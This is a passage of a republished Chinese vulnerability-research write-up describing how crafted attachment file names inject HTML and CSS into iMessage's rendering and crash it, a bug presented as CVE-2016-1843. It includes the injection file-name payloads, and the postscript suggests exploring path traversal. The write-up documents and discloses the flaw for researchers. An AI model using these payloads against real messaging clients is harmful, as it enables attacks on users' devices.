html/16)&nbsp;1x,&nbsp;url(transcript-resource://iconpreview/html-2x/16)&nbsp;2x);&quot;&gt;&lt;span&nbsp;class=&quot;transfer-text&quot;&nbsp;color-important=&quot;no&quot;&gt;tttt&lt;/span&gt;&lt;/transfer-atom&gt;&lt;div&nbsp;class=&quot;transfer-button-container&quot;&gt;&lt;&nbsp;img&nbsp;class=&quot;transfer-button-reveal&quot;&nbsp;aria-label=&quot;显示&quot;&nbsp;id=&quot;filetransfer-button-45B8E6BD-9826-47E2-B910-D584CE461E5F&quot;&nbsp;role=&quot;button&quot;&gt;&lt;/div&gt;&lt;/transfer&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发了个tttt.html的附件，这个附件的文件名出现在代码里，或许有控制的机会。多长测试后发现过滤也比较严格，不过最终还是发现一个潜在的点，也就是文件名的扩展名部分：</span></p><pre class="brush:html;toolbar:false">&lt;chatitem&nbsp;id=&quot;p:0/D4591950-20AD-44F8-80A1-E65911DCBA22&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;attachment&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/D4591950-20AD-44F8-80A1-E65911DCBA22&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;no&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;93D2D530-0E94-4CEB-A41E-2F21DE32715D&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-first-message=&quot;yes&quot;&nbsp;group-last-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;16:46:10&quot;&nbsp;file-transfer-element=&quot;yes&quot;&nbsp;aria-label=&quot;文件传输:&nbsp;testzzzzzzz&amp;quot;&#39;&amp;gt;&amp;lt;img&nbsp;src=1&amp;gt;.htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;transfer&nbsp;class=&quot;transfer&quot;&nbsp;id=&quot;A6BE6666-ADBF-4039-BF45-042D261EA458&quot;&nbsp;guid=&quot;A6BE6666-ADBF-4039-BF45-042D261EA458&quot;&gt;&lt;transfer-atom&nbsp;draggable=&quot;true&quot;&nbsp;aria-label=&quot;testzzzzzzz&amp;quot;&#39;&amp;gt;&amp;lt;img&nbsp;src=1&amp;gt;.htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d&quot;&nbsp;id=&quot;A6BE6666-ADBF-4039-BF45-042D261EA458&quot;&nbsp;guid=&quot;A6BE6666-ADBF-4039-BF45-042D261EA458&quot;&gt;&lt;&nbsp;img&nbsp;class=&quot;transfer-icon&quot;&nbsp;extension=&quot;htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d&quot;&nbsp;aria-label=&quot;文件扩展名:&nbsp;htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d&quot;&nbsp;style=&quot;content:&nbsp;-webkit-image-set(url(transcript-resource://iconpreview/htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d/16)&nbsp;1x,&nbsp;url(transcript-resource://iconpreview/htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d-2x/16)&nbsp;2x);&quot;&gt;&lt;span&nbsp;class=&quot;transfer-text&quot;&nbsp;color-important=&quot;no&quot;&gt;testzzzzzzz&quot;&#39;&amp;gt;&amp;lt;img&nbsp;src=1&amp;gt;&lt;/span&gt;&lt;/transfer-atom&gt;&lt;div&nbsp;class=&quot;transfer-button-container&quot;&gt;&lt;&nbsp;img&nbsp;class=&quot;transfer-button-reveal&quot;&nbsp;aria-label=&quot;显示&quot;&nbsp;id=&quot;filetransfer-button-A6BE6666-ADBF-4039-BF45-042D261EA458&quot;&nbsp;role=&quot;button&quot;&gt;&lt;/div&gt;&lt;/transfer&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们提交的附件的后缀进入了style ：</span></p><pre class="brush:html;toolbar:false">style=&quot;content:&nbsp;-webkit-image-set(url(transcript-resource://iconpreview/htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d/16)&nbsp;1x,&nbsp;url(transcript-resource://iconpreview/htm::16)&nbsp;1x,&nbsp;(aaa\\\\\\\\\\\%0a%0d-2x/16)&nbsp;2x);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">也就是可能导致css注入，或许我们还有机会，不过经过测试也是有过滤处理的，比如/ 直接被转为了:这个非常有意思 所谓“成也萧何，败也萧何”，如果你要注入css那么肯定给属性给值就得用: 但是:又不能出现在文件名里，然后我们要注入css里掉用远程css或者图片需要用/ 而/又被处理了变成了:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不管怎么样我先注入个css测试下，于是提交了一附件名：</span></p><pre class="brush:html;toolbar:false">&nbsp;zzzzzz.htm)&nbsp;1x);color/red;aaa/((</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">按推断/变为了: 如果注入成功应该是</span></p><pre class="brush:html;toolbar:false">style=&quot;content:&nbsp;-webkit-image-set(url(transcript-resource://iconpreview/htm::16)&nbsp;1x);color:red;aaa:((</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当我提交测试发送这个附件的时候，我的iMessage 崩溃了～～ 这里我想我发现了一个新的漏洞，于是我升级OSX到最新的系统重新测试结果：一个全新的0day诞生！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四、后记</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当然这里还有很多地方可以测试，也有一些思路也可以去测试下，比如那个名字那里这个应该是可控制的，比如附件是保存在本地的有没有可能存在目录专挑导致写到任意目录的地方。有需求的可以继续测试下，说不定下个0day就是你的 ：）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后我想说的是在分析别人发现的漏洞的时候一定要找到漏洞的关键，然后总结提炼出“模型”，然后去尝试新的攻击思路或者界面！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考链接</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="https://www.seebug.org/vuldb/ssvid-92471" _src="https://www.seebug.org/vuldb/ssvid-92471">https://www.seebug.org/vuldb/ssvid-92471</a></span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文转载自 SuperHei@seebug<br/><a class="text-more" href="http://paper.seebug.org/65/?from=timeline&amp;isappinstalled=0" target="_blank">原文链接：http://paper.seebug.org/65/?from=timeline&amp;isappinstalled=0</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】从老漏洞到新漏洞：iMessage 0day(CVE-2016-1843)挖掘实录 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3098" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="2771863157" class="response" data-bind-id="2771863157" data-target="4382" user-name="美少女战士" href="javascript:;">
+                美少女战士            </a>
+                        <span class="comment-time">2016-10-13 12:56:31</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2771863157" data-target="4382">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4382" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">很棒。</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/6x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="4379" user-name="路人甲" href="javascript:;">
+                路人甲            </a>
+                        <span class="comment-time">2016-10-13 09:46:28</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4379">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4379" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">学习了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3098" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
